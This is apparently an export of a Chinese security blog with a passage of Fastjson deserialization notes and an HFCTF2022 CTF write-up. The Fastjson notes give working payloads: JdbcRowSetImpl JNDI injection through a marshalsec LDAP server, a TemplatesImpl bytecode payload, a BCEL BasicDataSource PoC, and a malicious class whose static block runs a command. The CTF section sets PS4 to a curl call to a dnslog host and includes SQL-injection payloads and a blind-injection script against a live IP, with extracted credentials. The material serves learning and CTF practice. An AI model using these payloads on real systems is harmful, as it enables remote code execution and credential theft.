<p><code>&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;</code><br>还有一个和它名字差不多的类，叫<code>java.net.InetAddress</code>，少个6，这个类在48版本中被加入了黑名单（看别人说的），因此可以用上述两个类对fastjson漏洞的存在和版本进行探测<br>小于48刚好用Class加载类进缓存map一键打通</p>
<h3 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3><p>靠JNDI注入远程打的，没本地依赖限制，连上我的服务器返回一个恶意类在加载时就搞定</p>
<pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
String serializedStr <span class="token operator">=</span> <span class="token string">"{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://127.0.0.1:10000/Test\",\"autoCommit\": true}"</span><span class="token punctuation">;</span>
Object obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>高版本jdk因为防了一手JNDI注入，所以需要加上前面那一句去信任远程codebase，才能加载服务器上的reference对象，所以高版本jdk默认情况不是很打得通<br>不然就超级报错<br>LDAP server是网上找的工具，以如下命令启动<br><code>$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps/#Test 10000</code><br>写一个Test.java，放一个static段，在加载时就跑起来</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3><p>也不需要本地依赖，攻击方式是直接加载我们写好的bytecode但是由于这个类的<code>_bytecodes、_tfactory、_name、_outputProperties、_class</code>这堆私有属性均没有setter函数，所以要额外开一个<code>Feature.SupportNonPublicField</code>，非常鸡肋</p>
<p>还要预先准备好一个垃圾类，也是在静态段里面写恶意代码，但需要继承AbstractTranslet这个接口，编译好之后用base64编码放在bytecode属性处，用getOutputProperties函数触发（说起来之前实验是只有不指定类的parseObject在toJSON那会调用所有getter，但是这里似乎啥情况都能调用，是因为多套了一层吗？<br>getOutputProperties来触发</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>抄的payload</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> String NASTY_CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
        String payload <span class="token operator">=</span> <span class="token string">"{'rand1':{"</span> <span class="token operator">+</span>
                <span class="token string">"\"@type\":\""</span> <span class="token operator">+</span> NASTY_CLASS <span class="token operator">+</span> <span class="token string">"\","</span> <span class="token operator">+</span>
                <span class="token string">"\"_bytecodes\":[\""</span> <span class="token operator">+</span> evilCode_base64 <span class="token operator">+</span> <span class="token string">"\"],"</span> <span class="token operator">+</span>
                <span class="token string">"'_name':'aaa',"</span> <span class="token operator">+</span>
                <span class="token string">"'_tfactory':{},"</span> <span class="token operator">+</span>
                <span class="token string">"'_outputProperties':{}"</span> <span class="token operator">+</span>
                <span class="token string">"}}\n"</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="org-apache-tomcat-dbcp-dbcp-BasicDataSource"><a href="#org-apache-tomcat-dbcp-dbcp-BasicDataSource" class="headerlink" title="org.apache.tomcat.dbcp.dbcp.BasicDataSource"></a>org.apache.tomcat.dbcp.dbcp.BasicDataSource</h3><p>Tomcat 8.0后该类路径为org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>
<p>更新第三个payload，今天新学的BCEL Classloader，这个类和templateImpl有点像，均可以直接从字符串中还原字节码进行加载，但其相比于templateImpl而言所有需要可控的属性均为public的，因此利用条件会简单一些</p>
<p>然而，用于触发的这个类不知道会不会自带，不过应该提供了web服务就会带上tomcat的依赖吧（猜的）</p>
<p>p神也提到过BCEL Classloader，不过似乎在Jdk 8u251中已经移除了该Classloader<br><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a></p>
<p>但是我试了一下本地的jdk，在openjdk的8u292下，BCEL Classloader仍然存在，不过对于Oracle的jdk而言，确实没了</p>
<p>调用链为</p>
<pre class=" language-java"><code class="language-java">BasicDataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    BasicDataSource<span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        BasicDataSource<span class="token punctuation">.</span><span class="token function">createConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>而在createConnectionFactory函数中，调用了<code>Class.forName(driverClassName, true, driverClassLoader)</code>，这里就用上了我们一开始提到的这个BCEL Classloader，这个classloader重写了loadClass方法，会检查一下类名是不是以<code>$$BCEL$$</code>开头，如果是的话，就直接从类名中还原类的字节码。因此，还是照例写一个恶意类，在static段执行命令，然后把编译出来的.class文件使用<code>com.sun.org.apache.bcel.internal.classfile.Utility</code>的encode方法编码，作为payload，在BCEL Classloader加载时即可触发</p>
<p>这里贴一个poc</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
                <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="一些相关思考"><a href="#一些相关思考" class="headerlink" title="一些相关思考"></a>一些相关思考</h2><h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><p>考虑如何在反序列化时在已经指定了反序列化类的情况下反序列化我们自己的payload类<br>fastJson似乎在这里的检验并不是很严格，只需要最后的这个对象和指定的类一致就行了，也就是说，我们只要别太直接，不在最外层直接反序列化我们的payload，就能成功<br>比如，给指定的类加一个额外的属性，将这个属性的值赋为我们的payload，或是直接将指定类的一个属性赋值为一个JSONObject，然后再在JSONObject中反序列化我们的payload</p>
<h3 id="getter方法的触发"><a href="#getter方法的触发" class="headerlink" title="getter方法的触发"></a>getter方法的触发</h3><h4 id="1"><a href="#1" class="headerlink" title="#1"></a>#1</h4><p>在调用的是parseObject且未指定类时，反序列化出来的是JSONObject，会在toJSON方法中直接调用所有的getter</p>
<h4 id="2"><a href="#2" class="headerlink" title="#2"></a>#2</h4><p>为什么_outputProperties和getOutputProperties差了一个下划线，以及本身是一个get方法也能被主动调用？<br>参考一下这篇文章<br><a href="https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl利用链</a></p>
<p>判断的关键位置是JavaBeanInfo类的build函数<br>简单的看了一下，先看了下方法名是不是get开头的之类的简单判断，主要的判断条件是getter的返回值，如果满足如下条件就会把getter加入到FieldList里面，之后被调用</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicBoolean<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicInteger<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> AtomicLong<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span> 
</code></pre>
<p>而getOutputProperties的返回类型为Properties，继承自Hashtable，而Hashtable又implement了Map，所以刚好能被自动调用</p>
<h4 id="3"><a href="#3" class="headerlink" title="#3"></a>#3</h4><p>在不符合1、2的情况下如何主动去触发？<br>使用<code>$ref</code>对变量进行引用<br><a href="https://blog.csdn.net/solitudi/article/details/120275526">[Java安全]Fastjson＞&#x3D;1.2.36$ref引用可触发get方法分析</a><br><a href="https://paper.seebug.org/1613/">利用 fastjson $ref 构造 poc</a><br>具体过程并未细究，只是你引用一个对象，想当然的应该要获取那个对象的值，自然就会调用到getter方法，至于为什么在1.2.36之后才能用，上述文章有提及，暂时没有细究老版本fastjson实现时在考虑什么</p>
<h4 id="4"><a href="#4" class="headerlink" title="#4"></a>#4</h4><p>以及刚才的BasicDataSource的payload，这里有一个比较tricky的操作，即在整个payload外面多套了一层大括号，且将payload作为键而不是值。这是因为praseObject时才会对所有的getter进行调用，而仅仅是parse之后调用部分符合条件的getter，但这里的触发点，getConnection并不符合条件，于是通过多套一层大括号，将这个对象变为一个JSONObject，再令payload为JSON的key</p>
<blockquote>
<p>JSONObject是Map的子类，在执行toString()时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的getter、is等方法。<br>在JSON反序列化的时候，FastJson会对JSON Key自动调用toString()方法</p>
</blockquote>
<p>也就是说，这个payload完整情况下是这个样子的，不过fastJson会自己识别这个类就是一个JSONObject啦</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>
        <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
                <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">}</span>
</code></pre>
<p><a href="http://www.yulegeyu.com/2021/09/22/%E9%82%A3%E4%BA%9B%E5%B9%B4%E4%B8%80%E8%B5%B7%E6%89%93%E8%BF%87%E7%9A%84CTF-Laravel-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86Tricks%E5%88%86%E6%9E%90/">这篇博客</a>中提到在<code>fastjson&gt;1.2.36</code>后JSONObject不再对key进行toString操作，但是刚好又出现了<code>$ref</code>这个方法进行引用<br>除此之外，该文章提到虽然修改了不直接对key toString，但若key后面跟的不是0-9，字符串或<code>-</code>，又会对key使用toString，也就是说，把上述payload中的<code>&quot;x&quot;</code>改为一个空对象也可以进行触发</p>
<h3 id="漏洞的触发点"><a href="#漏洞的触发点" class="headerlink" title="漏洞的触发点"></a>漏洞的触发点</h3><p>很智障的想起来如果本地有依赖能不能拿CC之类的链来打，想到一半突然想起来这里的漏洞触发点并不是readObject，而是构造函数以及setter，getter。。。太愚蠢了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a><br><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">FastJson 反序列化学习</a><br>这个师傅还跟了一遍fastjson的json解析流程<br><a href="https://xz.aliyun.com/t/7027">JAVA反序列化—FastJson组件</a><br><a href="https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl利用链</a><br><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2022坐牢复现</title>
    <url>/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="HFCTF2022坐牢复现"><a href="#HFCTF2022坐牢复现" class="headerlink" title="HFCTF2022坐牢复现"></a>HFCTF2022坐牢复现</h1><p>高强度坐牢，四个web只会一个最简单的SQL。ezphp跟着p神文章调一天调不通自闭了。日路由器看都不想看，java很有兴趣但能力有限，复现会重点研究</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>环境就和p神这篇<a href="https://tttang.com/archive/1450/">文章</a>的基本一致，用的nginx服务器，fpm通信是本地端口不是Unix socket，然后对着p神的文章搭了一个远程调试环境搞了好久。刚好把上个星期学codeql下的vscode利用起来了</p>
<p>调试环境搭建搭完就忘了怎么搞的了，反正最后配这个launch.json文件就行</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>
    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>
            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>
            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>
            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"${workspaceFolder}/bin/dash"</span><span class="token punctuation">,</span>     
            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"-xi"</span><span class="token punctuation">,</span> <span class="token string">"echo hello"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"${workspaceFolder}"</span><span class="token punctuation">,</span>
            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"PS4"</span><span class="token punctuation">,</span>
                    <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"$(curl tfaf1s.dnslog.cn)"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>
            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"为 gdb 启用整齐打印"</span><span class="token punctuation">,</span>
                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>
                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">false</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre>
<p>根据p神的说法，ENV变量需要-i参数才能命令执行，复现成功，而system启用的为<code>sh -c</code>，Debian系sh软链接到dash，下载对应源码编译一个dash调试</p>
<p>除去p神说的ENV，还有三个备选选项PS1&#x2F;2&#x2F;4。分别调一下，先全局搜p神提到的入口函数<code>expandstr</code>，的确能迅速定位到PS系列变量进入了该函数，首先是ps4</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323195947515.png" alt="image-20220323195947515"></p>
<p>然而这里有一个xflag的判断，也就是需要-x</p>
<p>然后是这个<code>getprompt</code>里面有机会对ps1&#x2F;2进expandstr</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200132881.png" alt="image-20220323200132881"></p>
<p>但是需要看whichprompt的值，跟一下。这玩意是个全局变量，正如p神所言，这里面一把一把的全局变量，goto到还好没怎么见，全局变量满天飞。其在setprompt中赋值，继续追<br>有几个可能，一个是needprompt不为0即赋值为2，该值默认是0，还有一个doprompt，同样不为0时赋值为2</p>
<p>doprompt在parsecmd里初始化，其参数即为doprompt的值，然后找parsecmd的调用点</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323200813413.png" alt="image-20220323200813413"></p>
<p>传入的是inter，默认为0，有iflag的时候++，也就是-i，用不了，<br>还能找到一个赋值点是等于saveprompt，然而这段代码长这样。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201104572.png" alt="image-20220323201104572"></p>
<p>而needprompt除了默认赋值为0外只有一个等于doprompt，也没有用</p>
<p>最终得到的结论是p神这个操作在Debian系下在只有一个-c的情况下全都不能触发。。。至少得-i或者-x。还得是暂且不论无法执行的情况下</p>
<p>即便如此我还调了一下p神说的变量能够解析但命令会报错的问题。psx系列变量的值找定义是一个复杂结构体，直接不想看，没找到赋值是在哪，在调试的时候发现其值一直是定值，并且在某个配置文件里面找到了对应的定值</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323201331441.png" alt="image-20220323201331441"></p>
<p>跟了一下ENV的成功流程，是从expandstr进expandarg进argstr进expbackq，进evalbackcmd进forkshell。然后里面fork了一下成功了。但实际上跟PS4的时候发现在某一步的时候switch case的值就不一样了。然后具体是哪出了问题就没调了。现在有点忘了，好像是argstr函数里出问题了？</p>
<p>最后看他们的解是hxpctf里面那招究极发文件让nginx缓存然后proc访问。env写LD_PRELOAD做到rce。。。这个比赛我打了的来着，但是一时间真没想到这个操作</p>
<p>以及这回文件读都没有，nginx进程就全靠猜。。。也不是不能爆，运气游戏嘛</p>
<h2 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h2><p>是不是叫这个名字来着，忘了，反正这次比赛的名字不是baby就是ez。哈哈</p>
<p>SQL注入，给了个正则表达式的提示，还给了个hint.md的提示（我一开始以为要先打到读文件读这个hint.md。。。。结果是直接访问）</p>
<p>过滤了空格和括号，过滤括号算是大杀器了，然后还有些其他的乱七八糟字符比如<code>\*()</code>之类的，具体有哪些忘了，也过滤了union和binary两个关键字，登录操作是select用户名对应的所有，然后对密码进行一个强比较</p>
<p>提示了用正则就用呗，然后因为不知道密码，无论怎么登录都是401未授权，用户名处塞引号就SQL出错500，那么思路就是整数溢出注入了。直接~0+1急速构造出整数溢出。又因为密码列就在当前表下，直接regexp进行比对即可，对列名用反引号括起来替代空格，写了类似于这样子的payload</p>
<pre><code>&#39;||~0+&#39;^a&#39;regexp`password`&amp;&amp;&#39;1
</code></pre>
<p>但是证书溢出的情况似乎不是很乐观，并没有产生溢出，不知道是不是因为这个奇怪的加法的原因，但不能用括号就不能if，不然就能直接~0+1</p>
<p>然后sql大师znj写了个case的操作完成了这一任务</p>
<pre><code>&#39;||case`password`regexp&#39;^.+$&#39;when&#39;1&#39;then~0+1+&#39;&#39;else&#39;&#39;end&amp;&amp;&#39;1
</code></pre>
<p>写出盲注脚本，得出用户名密码长度和内容</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token comment" spellcheck="true"># user qay8tefyzc67aeoo len 16</span>
<span class="token comment" spellcheck="true"># pass m52fpldxyylb^eizar!8gxh$ len 24</span>
url <span class="token operator">=</span> <span class="token string">"http://47.107.231.226:29514/login"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||case`password`regexp'^.{}$'when'1'then~0+1+''else''end&amp;&amp;'1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
        <span class="token keyword">break</span>


charset <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz!$&amp;+./:&lt;=>?@^`{|}~"</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"'||case`password`like'{}%'when'1'then~0+1+''else''end&amp;&amp;'1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(data['username'])</span>
        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> c
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]result: "</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre>
